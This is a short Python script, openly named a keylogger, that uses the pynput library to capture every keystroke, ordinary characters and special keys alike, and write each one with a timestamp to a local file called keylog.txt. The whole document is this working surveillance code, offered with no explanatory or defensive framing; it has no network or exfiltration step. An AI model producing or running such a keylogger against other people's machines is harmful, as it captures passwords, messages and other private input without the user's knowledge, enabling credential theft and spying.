from pynput.keyboard import Listener
import logging

# Configure the log file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        if hasattr(key, 'char'):
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        start_keylogger()
    except Exception as e:
        logging.error(f"Error starting keylogger: {e}")
